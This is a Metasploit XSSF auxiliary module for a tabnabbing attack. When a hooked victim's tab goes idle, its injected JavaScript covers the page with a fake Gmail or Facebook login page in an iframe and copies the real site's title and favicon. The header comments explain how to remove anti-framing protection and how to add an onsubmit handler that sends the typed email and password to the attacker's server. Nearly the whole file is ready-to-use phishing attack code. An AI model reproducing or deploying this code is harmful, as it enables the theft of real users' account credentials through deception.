require 'msf/core'
require 'msf/base/xssf'

#
# Change Browser Tabs after a period of time of inactivity
# CAUTION : TO USE THIS MODULE FOR NEW WEBSITES, BE SURE TO REMOVE THE IFRAME PROTECTION
# IN THE .HTML FILE. THE .HTML FILE HAS TO BE LOADED IN AN IFRAME.
# EXEMPLE (GMAIL) : "if (top.location != self.location) { top.location = self.location.href; }"
#
# ADD XSSF_POST() FUNCTION IN HTML FILE TO STEAL USER INFORMATION
# EXEMPLE (GMAIL) : onsubmit="XSSF_POST('Gmail Account : ' + document.getElementById('Email').value + ' - ' + document.getElementById('Passwd').value); return(gaia_onLoginSubmit());"
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Browser Tabs Changer',
			'Description' => 'Change Browser Tabs after a period of time of inactivity'
		))
		
		register_options(
			[
				OptEnum.new('website', [true, "Defaced website file you want to load (without .html, included in '#{Msf::Xssf::INCLUDED_FILES}')", 'gmail', ['gmail', 'facebook']]),
				OptInt.new('delay', [true, "Delay of tab inactivity in seconds to change it", 5])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		websites = {}
		websites['gmail'] = []
		websites['gmail'][0] = 'https://mail.google.com'
		websites['gmail'][1] = 'Gmail: Email from Google'
		websites['facebook'] = []
		websites['facebook'][0] = 'http://www.facebook.com'
		websites['facebook'][1] = 'Welcome to Facebook'
		
		code = %Q{
			/*
				Copyright (c) 2010 Aza Raskin
				http://azarask.in

				Permission is hereby granted, free of charge, to any person
				obtaining a copy of this software and associated documentation
				files (the "Software"), to deal in the Software without
				restriction, including without limitation the rights to use,
				copy, modify, merge, publish, distribute, sublicense, and/or sell
				copies of the Software, and to permit persons to whom the
				Software is furnished to do so, subject to the following
				conditions:

				The above copyright notice and this permission notice shall be
				included in all copies or substantial portions of the Software.
			*/


			(function(){
				var TIMER = null;
				var HAS_SWITCHED = false;

				// Events
				window.onblur = function(){
					TIMER = setTimeout(changeItUp, #{datastore['delay'].to_i * 1000});
				}  

				window.onfocus = function(){
					if(TIMER) clearTimeout(TIMER);
				}

				// Utils
				function setTitle(text){ document.title = text; }

				// This favicon object rewritten from:
				// Favicon.js - Change favicon dynamically [http://ajaxify.com/run/favicon].
				// Copyright (c) 2008 Michael Mahemoff. Icon updates only work in Firefox and Opera.

				favicon = {
					docHead: document.getElementsByTagName("head")[0],
					set: function(url){
						this.addLink(url);
					},
				  
					addLink: function(iconURL) {
						var link = document.createElement("link");
						link.type = "image/x-icon";
						link.rel = "shortcut icon";
						link.href = iconURL;
						this.removeLinkIfExists();
						this.docHead.appendChild(link);
					},

					removeLinkIfExists: function() {
						var links = this.docHead.getElementsByTagName("link");
						for (var i=0; i<links.length; i++) {
							var link = links[i];
							if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
								this.docHead.removeChild(link);
								return; // Assuming only one match at most.
							}
						}
					} 
				};

				function createShield(){	
					div = document.createElement("div");
					div.style.position = "absolute";
					div.style.top = 0;
					div.style.left = 0;
					div.style.backgroundColor = "white";
					div.style.width = "100%";
					div.style.height = "100%";
					div.style.textAlign = "center";
					document.body.style.overflow = "hidden";
				  
					iframe = createCrossIframe("MY_IFRAME", 100, 100)
					iframe.src =  SERVER + "#{datastore['website']}.html";
					div.appendChild(iframe);
					document.body.appendChild(div);				
				}

				function changeItUp(){
					if(HAS_SWITCHED == false){
						createShield("#{websites[datastore['website']][0]}");
						setTitle("#{websites[datastore['website']][1]}");
						favicon.set("#{websites[datastore['website']][0]}/favicon.ico");
						HAS_SWITCHED = true;    
					}
				}
			})();
		}

		send_response(cli, code)
	end
end